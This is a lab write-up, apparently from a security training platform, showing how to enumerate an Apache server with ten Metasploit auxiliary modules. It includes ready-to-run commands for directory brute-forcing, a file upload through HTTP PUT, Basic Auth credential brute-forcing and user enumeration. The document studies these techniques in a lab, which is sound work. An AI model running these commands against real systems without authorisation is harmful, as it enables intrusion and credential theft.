# Apache Enumeration with Metasploit

This lab demonstrates how to enumerate an Apache web server using different Metasploit auxiliary modules. Each module reveals useful information such as server version, hidden directories, login pages, and user directories.

---

## 🧪 Lab Environment
- Target: `victim-1` (Apache 2.4.18 on Ubuntu)
- Tool: `Metasploit Framework`
- Goal: Perform enumeration using Metasploit modules

---

## 🔍 Step-by-Step Enumeration

### 🟢 Step 1: Check Target is Alive
```bash
ping -c 5 victim-1
```

---

### 🧩 Module 1: `http_version`
```bash
use auxiliary/scanner/http/http_version
set RHOSTS victim-1
run
```
> Detects Apache version: `Apache/2.4.18 (Ubuntu)`

---

### 🧩 Module 2: `robots_txt`
```bash
use auxiliary/scanner/http/robots_txt
set RHOSTS victim-1
run
```
> Found disallowed paths:
```
/data
/secure
```

---

### 🧩 Module 3: `http_header`
```bash
use auxiliary/scanner/http/http_header
set RHOSTS victim-1
run
```

#### 🔁 With Target Path:
```bash
set TARGETURI /secure
```
> `/secure` is protected with Basic Auth

---

### 🧩 Module 4: `brute_dirs`
```bash
use auxiliary/scanner/http/brute_dirs
set RHOSTS victim-1
run
```
> Found paths: `/doc`, `/pro`

---

### 🧩 Module 5: `dir_scanner`
```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS victim-1
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

---

### 🧩 Module 6: `dir_listing`
```bash
use auxiliary/scanner/http/dir_listing
set RHOSTS victim-1
set PATH /data
run
```
> Directory listing enabled for `/data`

---

### 🧩 Module 7: `files_dir`
```bash
use auxiliary/scanner/http/files_dir
set RHOSTS victim-1
set VERBOSE false
run
```

---

### 🧩 Module 8: `http_put` (File Upload)
```bash
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run
```

#### 📥 Then verify upload:
```bash
wget http://victim-1/data/test.txt
cat test.txt
```

#### ❌ Delete uploaded file:
```bash
set ACTION DELETE
```

---

### 🧩 Module 9: `http_login`
```bash
use auxiliary/scanner/http/http_login
set RHOSTS victim-1
set AUTH_URI /secure/
set VERBOSE false
run
```
> Valid credentials found: `bob:123321`

---

### 🧩 Module 10: `apache_userdir_enum`
```bash
use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS victim-1
set VERBOSE false
run
```

> Found user directories:
- rooty
- bin
- games
- nobody
- sync
- …

---

## ✅ Summary

We used 10 different auxiliary modules in Metasploit to:
- Detect Apache version
- Discover hidden paths and login pages
- Upload and remove files
- Enumerate usernames and home directories
- Identify valid login credentials
